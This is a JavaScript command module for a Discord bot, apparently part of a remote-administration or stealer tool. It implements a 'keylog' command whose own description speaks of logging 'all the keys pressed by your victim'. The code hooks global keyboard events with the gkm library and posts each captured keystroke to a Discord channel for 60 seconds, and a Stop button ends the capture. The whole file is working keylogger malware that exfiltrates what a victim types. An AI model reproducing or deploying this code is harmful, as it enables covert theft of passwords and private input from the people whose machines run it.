const { ActionRowBuilder, ButtonBuilder, ApplicationCommandOptionType } = require("discord.js"),
 gkm = require("gkm");

module.exports = {
  name: "keylog",
  ownerOnly: true,
  description: "Log all the keys pressed by your victim",

  run: async (client, interaction, args) => {
    const stopButton = new ButtonBuilder()
      .setCustomId('stopLogging')
      .setLabel('Stop')
      .setStyle('Danger');

    const row = new ActionRowBuilder().addComponents(stopButton);

    // Envoyer le message avec le bouton "Stop"
    await interaction.reply({
      content: `Keyboard Logged`,
      ephemeral: true,
      components: [row],
    });

    // Lancer le logger
    await BlackKey(interaction);
  },
};
async function BlackKey(interaction) {
    let g = false;
    // Enregistrer l'ID de l'utilisateur pour les permissions
    const userId = interaction.user.id;
  
    // Log les touches pendant la durée spécifiée
    const startTime = Date.now();
    const durationInSeconds = 60; // Durée par défaut (modifiable selon les besoins)
    const durationInMilliseconds = durationInSeconds * 1000;
  
    // Créer un collecteur de boutons
    const collector = interaction.channel.createMessageComponentCollector({
      filter: (i) => i.customId === 'stopLogging' && i.user.id === userId,
      time: durationInMilliseconds,
    });
  
    collector.on('collect', async (i) => {
        g = true
      // Arrêter le logger lorsque le bouton "Stop" est cliqué
      collector.stop();
      await interaction.followUp('Keylogger stopped.');
    });
  
    collector.on('end', (collected, reason) => {
      // Finir la fonction lorsque le collecteur se termine
      console.log(`Collector ended for reason: ${reason}`);
    });
  
    while (Date.now() - startTime < durationInMilliseconds) {
      const keyEvent = await new Promise(resolve => {
        gkm.events.once("key.pressed", resolve);
      });
  
      const cle = keyEvent[0].toLowerCase();
      if (cle.includes("retour") || cle.includes("backspace")) continue;
  
      console.log(cle);
      if(g)return;
      // Envoyer la touche dans le canal Discord
      await interaction.followUp(cle);
    }
  }